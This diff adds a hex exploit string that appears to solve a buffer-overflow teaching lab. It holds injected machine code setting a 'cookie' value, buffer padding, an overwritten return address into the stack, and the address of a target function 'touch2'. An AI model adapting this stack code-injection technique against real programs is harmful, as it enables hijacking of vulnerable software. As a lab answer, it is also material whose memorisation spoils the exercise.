@@ -1,0 +1,5 @@
+48 c7 c7 88 5d 09 25 c3 /*This sets my cookie */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*The 00 bytes are padding for the buffer */
+58 2c 68 55 00 00 00 00 /*address of register %rsp */
+3f 13 3f 00 00 00 00 00 /*address of touch2 */
